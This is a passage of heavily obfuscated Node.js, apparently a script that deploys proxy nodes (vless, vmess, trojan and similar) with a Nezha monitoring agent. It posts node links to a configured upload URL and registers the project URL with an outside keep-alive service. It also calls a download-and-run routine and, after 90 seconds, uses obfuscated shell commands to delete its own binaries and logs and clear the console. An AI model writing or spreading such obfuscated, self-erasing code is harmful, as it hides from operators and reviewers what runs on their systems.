_0x2cb779=fs[_0xbe532b(0x1f4)](listPath,'utf-8'),_0x33340f=_0x2cb779[_0xbe532b(0x1da)]('\x0a')[_0xbe532b(0x20a)](_0x1d42f7=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xbe532b(0x16e)](_0x1d42f7));if(_0x33340f[_0xbe532b(0x199)]===0x0)return;const _0x1261fe=JSON[_0xbe532b(0x1ef)]({'nodes':_0x33340f});try{const _0x29f522=await axios[_0xbe532b(0x1b9)](UPLOAD_URL+_0xbe532b(0x15b),_0x1261fe,{'headers':{'Content-Type':'application/json'}});return _0x29f522&&_0x29f522[_0xbe532b(0x1a3)]===0xc8?(console[_0xbe532b(0x1f7)](_0xbe532b(0x1c3)),_0x29f522):null;}catch(_0x58d0b3){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x1c6149=_0x185f,_0x1495ae=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1495ae[_0x1c6149(0x18f)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1495ae[_0x1c6149(0x18f)](phpPath);process[_0x1c6149(0x1ea)]===_0x1c6149(0x175)?exec(_0x1c6149(0x214)+_0x1495ae[_0x1c6149(0x1a7)]('\x20')+_0x1c6149(0x202),_0x41f755=>{const _0x42c015=_0x1c6149;console['clear'](),console['log'](_0x42c015(0x1e1)),console[_0x42c015(0x1f7)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x1c6149(0x18e)+_0x1495ae[_0x1c6149(0x1a7)]('\x20')+_0x1c6149(0x1d3),_0x14812a=>{const _0x51cdce=_0x1c6149;console[_0x51cdce(0x1a5)](),console[_0x51cdce(0x1f7)](_0x51cdce(0x1e1)),console[_0x51cdce(0x1f7)](_0x51cdce(0x180));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x399257=_0x2f8387;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x399257(0x1f7)](_0x399257(0x154));return;}try{const _0x466eab=await axios[_0x399257(0x1b9)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console['log'](_0x399257(0x1e8)),_0x466eab;}catch(_0x25fa6a){return console[_0x399257(0x15f)](_0x399257(0x1be)+_0x25fa6a[_0x399257(0x200)]),null;}}async function startserver(){const _0x24ac57=_0x2f8387;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4b342c){console[_0x24ac57(0x15f)](_0x24ac57(0x1f9),_0x4b342c);}}startserver()[_0x2f8387(0x1bc)](_0x3412f4=>{const _0x5ef347=_0x2f8387;console[_0x5ef347(0x15f)]('Unhandled\x20error\x20in\x20startserver:',_0x3412f4);}),app[_0x2f8387(0x1fb)]('/',async function(_0x28582a,_0x2d448c){const _0x46d58c=_0x2f8387;try{const _0x510715=path['join'](__dirname,_0x46d58c(0x157)),_0x26acf7=await fs[_0x46d58c(0x1f5)]['readFile'](_0x510715,_0x46d58c(0x1a9));_0x2d448c[_0x46d58c(0x160)](_0x26acf7);}catch(_0x2f0c55){_0x2d448c[_0x46d58c(0x160)](_0x46d58c(0x167));}}),app[_0x2f8387(0x1eb)](PORT,()=>console[_0x2f8387(0x1f7)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
